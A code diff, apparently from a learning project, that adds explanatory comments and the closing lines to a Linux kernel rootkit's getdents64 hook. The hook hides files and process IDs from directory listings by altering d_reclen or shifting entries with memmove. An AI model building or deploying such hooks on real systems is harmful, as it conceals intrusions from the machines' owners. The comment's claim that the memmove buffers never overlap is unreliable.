@@ -122,8 +122,44 @@ static asmlinkage long hook_getdents64(unsigned int fd,
         return ret;
     }
 
-/*
+/* Explaination for Below:
+ * prev = NULL; offset = 0 = start at beginning, no entry yet
+ * cur = (...) = cast raw bytes at current kernel buffer position into linux_dirent64 struct so can read fields
+ * bool hide = false = flag to hide entry in 'ls', starts as false
+ * strncmp(cur->d_name ...) = compares first N chars of entry name against prefix, and then if it matches hide it.
+ *                            ret = 0 when it matches
+ * simple_strtol = tries to parse entry name as a number; if it successfully parses and it's in the hidden PID list, hide
+ *                 it. It's specfiically how processes are hidden, /proc lists PIDs as # dirs
  *
+ * Actual hiding has 2 cases:
+ *      prev exists = extend prev entry d_reclen to grab this one, kernel walks entries by jumping forward "d_reclen" bytes
+ *                    each time, so making the previous entry longer causes the kernel to skip right over the hidden one.
+ *      no prev = first entry, so memmove everything after it to overwrite, then reduce ret so the caller thinks the buffer
+ *                is shorter.
+ *
+ * -------------------------------------------------------------------------------------------------------------------------
+ * I didn't quite get this, so this is how it actually works:
+ * getdent64 fills a buffer with entries like this - [ entry A ][ entry B ][ entry C ][ entry D ]
+ * Each entry has a d_reclen field that says "I'm this long, and the next entry starts right after"
+ *
+ * There's 2 situations to try and hide entry C in this case, 1 would be if C is *not* the first entry (so prev) and the
+ * other is C *is* the first (no prev).
+ *
+ * Case 1) Just lie about B's length
+ * B's size would be set with this formula: B.d_reclen = B.d_reclen + C.d_reclen
+ * Now, the buffer looks the same in mem so it doesn't make anything break, but when the kernel reads B and jumps forward,
+ * it'll skip over C because the length of B is set as B + C, landing directly on D.
+ *
+ * Case 2) Physically slide everything after C backwards to overwrite it
+ * In this example the data would be physically copied and moved backwards, moving entry D into the place where entry C is.
+ * That's where memmove is necessary, it copies bytes from one place to another, handling overlaps.
+ * Then C's size is subtracted from the buffer (subtracted from ret) so it never see where C would've been and doesn't error
+ * 'memmove' is used here instead of 'memcopy' because memcopy is undefined when source and destination would overlap. They
+ * *don't* overlap here, but it's safer to just use it when working with buffers just in case something would happen.
+ * -------------------------------------------------------------------------------------------------------------------------
+ *
+ * continue ~> skips offset at the bottom since everything would've been moved
+ * offset = ... = advance to next entry
  */
 
     prev = NULL;
@@ -151,9 +187,14 @@ static asmlinkage long hook_getdents64(unsigned int fd,
         offset += cur->d_reclen;
     }
 
+    if (copy_to_user(dirent, kbuf, ret)) {
+        kfree(kbuf);
+        return -EFAULT;
+    }
 
-
-
+    kfree(kbuf);
+    return ret;
+}
 
 
 
